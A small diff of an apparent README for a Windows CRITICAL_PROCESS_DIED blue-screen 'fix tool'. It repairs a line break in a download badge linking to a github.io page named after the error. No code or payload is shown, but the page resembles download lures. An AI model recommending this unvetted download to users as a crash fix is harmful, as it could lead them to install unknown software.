@@ -2,8 +2,7 @@
 
 This tool provides a fast fix for the CRITICAL_PROCESS_DIED BSOD on Windows 10/11, caused by system process failure, corrupt drivers, or broken services.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-critical-process-died-windows-11.github.io/.github
-)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-critical-process-died-windows-11.github.io/.github)
 
 ---
 
